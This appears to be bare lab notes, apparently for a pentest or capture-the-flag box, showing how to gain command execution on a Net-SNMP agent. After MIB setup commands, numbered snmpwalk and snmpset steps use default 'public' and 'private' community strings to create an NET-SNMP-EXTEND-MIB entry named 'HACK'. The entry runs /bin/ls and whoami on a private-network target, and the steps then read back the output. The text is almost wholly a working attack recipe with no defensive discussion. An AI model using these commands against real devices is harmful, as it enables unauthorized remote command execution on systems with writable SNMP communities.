

sudo git clone https://github.com/net-snmp/net-snmp.git

<img width="1270" height="841" alt="image" src="https://github.com/user-attachments/assets/bc6b36c4-6e2e-4d80-8a68-927290b17ad0" />




sudo mkdir -p /usr/share/snmp/mibs
sudo cp -r /usr/share/snmp/net-snmp/mibs/* /usr/share/snmp/mibs/


mkdir -p ~/.snmp/mibs
cp -r /usr/share/snmp/net-snmp/mibs/* ~/.snmp/mibs/


export MIBDIRS="/usr/share/snmp/mibs:~/.snmp/mibs"
export MIBS=+ALL





1
snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendObjects

2
snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"HACK\"

or 

snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\"HACK\"



3
snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendCommand.\"HACK\" s /bin/ls

or
snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendArgs.\"HACK\" s "-la"


4
snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"HACK\"


5
snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendStatus.\"HACK\" i 6

6
snmpset -v2c -c private 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendCommand.\"WHO\" s /usr/bin/whoami
snmpwalk -v2c -c public 192.168.202.149 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\"WHO\"

7
snmpwalk -v2c -c public 192.168.202.149 1.3.6.1.4.1.8072.1.3



